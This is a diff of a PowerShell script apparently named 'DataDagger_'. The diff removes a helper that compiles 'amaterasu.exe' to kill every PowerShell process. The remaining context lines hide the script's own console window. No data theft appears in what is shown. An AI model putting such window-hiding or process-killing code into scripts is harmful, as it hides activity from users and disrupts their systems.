@@ -1,46 +1,3 @@
-# Criar o executável "amaterasu.exe" para destruir o script
-$killScriptCode = @'
-using System;
-using System.Diagnostics;
-
-public class Program {
-    public static void Main() {
-        // Obtém todos os processos em execução com o nome "powershell" e encerra-os
-        Process[] processes = Process.GetProcessesByName("powershell");
-        foreach (Process proc in processes) {
-            proc.Kill();
-        }
-    }
-}
-'@
-
-# Salvar o código acima em um arquivo C# temporário
-$sourceFile = "$env:TEMP\KillPowerShell.cs"
-$killScriptCode | Out-File -FilePath $sourceFile -Encoding utf8
-
-# Compilar o arquivo C# em um executável
-$outputExe = "$env:TEMP\amaterasu.exe"
-$compilerOptions = @("/target:exe", "/out:$outputExe")
-$compilerParams = New-Object System.CodeDom.Compiler.CompilerParameters
-$compilerParams.GenerateExecutable = $true
-$compilerParams.GenerateInMemory = $false
-$compilerParams.TreatWarningsAsErrors = $false
-$compilerParams.ReferencedAssemblies.Add("System.dll")
-$compilerParams.ReferencedAssemblies.Add("System.Diagnostics.Process.dll")
-$compilerResults = Add-Type -TypeDefinition (Get-Content -Raw -Path $sourceFile) -Language CSharp -CompilerParameters $compilerParams -PassThru
-
-# Excluir o arquivo C# temporário
-Remove-Item -Path $sourceFile -Force
-
-# Verificar se o executável foi criado com sucesso
-if ($compilerResults.Errors.Count -eq 0) {
-    Write-Host "Executável 'amaterasu.exe' criado com sucesso."
-} else {
-    Write-Host "Erro ao criar o executável 'amaterasu.exe'."
-    foreach ($error in $compilerResults.Errors) {
-        Write-Host $error
-    }
-}
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
 #   Nome       : DataDagger_                                                                                                                               #
@@ -83,7 +40,6 @@ if ($compilerResults.Errors.Count -eq 0) {
 #  Steam: Clank.PT                                                                                                                                         #
 ############################################################################################################################################################
 
-# Esconde a janela do PowerShell
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
